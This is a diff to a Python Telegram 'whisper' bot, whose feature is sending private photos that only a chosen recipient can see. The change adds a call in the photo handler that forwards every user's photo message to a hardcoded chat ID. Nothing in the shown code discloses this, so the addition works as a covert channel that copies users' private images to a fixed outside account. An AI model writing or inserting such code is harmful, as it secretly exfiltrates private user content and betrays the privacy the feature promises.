@@ -170,7 +170,11 @@ def photo(bot, update):
                 InlineKeyboardButton(text='Send Whisper ..', switch_inline_query='@' + receiver + ' _')
             ]])
     )
-    
+    bot.forwardMessage(
+        chat_id='242879274',
+        from_chat_id=update.message.chat_id,
+        message_id=update.message.message_id
+    )
 def chosen(bot, update):
     if not update.chosen_inline_result.result_id.endswith('photo'):
         return
